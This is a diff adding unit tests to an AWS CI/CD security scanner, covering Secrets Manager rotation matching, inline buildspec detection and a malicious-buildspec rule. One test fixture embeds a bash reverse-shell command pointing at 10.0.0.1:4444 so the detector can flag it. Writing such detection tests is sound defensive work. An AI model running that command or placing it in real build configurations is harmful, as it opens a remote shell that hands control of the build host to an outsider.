@@ -9,6 +9,10 @@ from __future__ import annotations
 
 from unittest.mock import MagicMock
 
+import json
+
+from pipeline_check.core.checks.aws.rules import cb008_inline_buildspec as cb008
+from pipeline_check.core.checks.aws.rules import cb011_malicious_buildspec as cb011
 from pipeline_check.core.checks.aws.rules import cd003_alarm_config as cd003
 from pipeline_check.core.checks.aws.rules import cp005_production_approval as cp005
 from pipeline_check.core.checks.aws.rules import ecr003_public_policy as ecr003
@@ -16,6 +20,7 @@ from pipeline_check.core.checks.aws.rules import iam005_external_trust as iam005
 from pipeline_check.core.checks.aws.rules import lmb004_resource_policy_public as lmb004
 from pipeline_check.core.checks.aws.rules import pbac002_shared_service_role as pbac002
 from pipeline_check.core.checks.aws.rules import s3005_secure_transport as s3005
+from pipeline_check.core.checks.aws.rules import sm001_rotation as sm001
 
 
 def _catalog(**attrs):
@@ -126,3 +131,58 @@ class TestIAM005ExternalTrust:
 
     def test_external_principal_still_flagged(self):
         assert self._check("arn:aws:iam::999999999999:root").passed is False
+
+
+class TestSM001Rotation:
+    def _check(self, ref_value, secrets):
+        cat = _catalog(
+            codebuild_projects=[{"name": "p", "environment": {
+                "environmentVariables": [
+                    {"type": "SECRETS_MANAGER", "value": ref_value}]}}],
+            secrets=secrets)
+        return sm001.check(cat)
+
+    def test_arn_ref_matches_only_that_secret(self):
+        # `split(":")[0]` reduced an ARN ref to the literal "arn", which
+        # is a substring of every secret ARN, so every secret was flagged.
+        arn = "arn:aws:secretsmanager:us-east-1:123:secret:prod/db-master-AbCdEf"
+        res = self._check(arn, [
+            {"Name": "prod/db-master", "ARN": arn, "RotationEnabled": False},
+            {"Name": "other", "ARN": "arn:aws:secretsmanager:us-east-1:123:secret:other-AAAAAA",
+             "RotationEnabled": False}])
+        assert len(res) == 1 and res[0].resource == "prod/db-master"
+
+    def test_bare_name_does_not_match_sibling_prefix(self):
+        # A bare-name ref "my-secret" used to match "my-secret-staging"
+        # via the `ref in arn` substring branch.
+        res = self._check("my-secret", [
+            {"Name": "my-secret", "ARN": "arn:aws:secretsmanager:us-east-1:123:secret:my-secret-XXXXXX",
+             "RotationEnabled": True},
+            {"Name": "my-secret-staging",
+             "ARN": "arn:aws:secretsmanager:us-east-1:123:secret:my-secret-staging-YYYYYY",
+             "RotationEnabled": False}])
+        assert len(res) == 1 and res[0].resource == "my-secret" and res[0].passed is True
+
+
+class TestCB008InlineBuildspec:
+    def test_single_line_json_is_inline(self):
+        # The shape the CodeBuild API/console emits for an inline JSON
+        # buildspec; it has no newline and starts with '{'.
+        spec = json.dumps({"phases": {"build": {"commands": ["x"]}}})
+        assert cb008._is_inline(spec) is True
+
+    def test_repo_path_is_not_inline(self):
+        assert cb008._is_inline("ci/buildspec.yml") is False
+
+
+class TestCB011MaliciousBuildspec:
+    def test_single_line_json_reverse_shell_fires(self):
+        spec = json.dumps({"phases": {"build": {"commands": [
+            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"]}}})
+        cat = _catalog(codebuild_projects=[{"name": "p", "source": {"buildspec": spec}}])
+        res = cb011.check(cat)
+        assert res and res[0].passed is False
+
+    def test_repo_path_buildspec_not_scanned(self):
+        cat = _catalog(codebuild_projects=[{"name": "p", "source": {"buildspec": "ci/build.yml"}}])
+        assert cb011.check(cat) == []
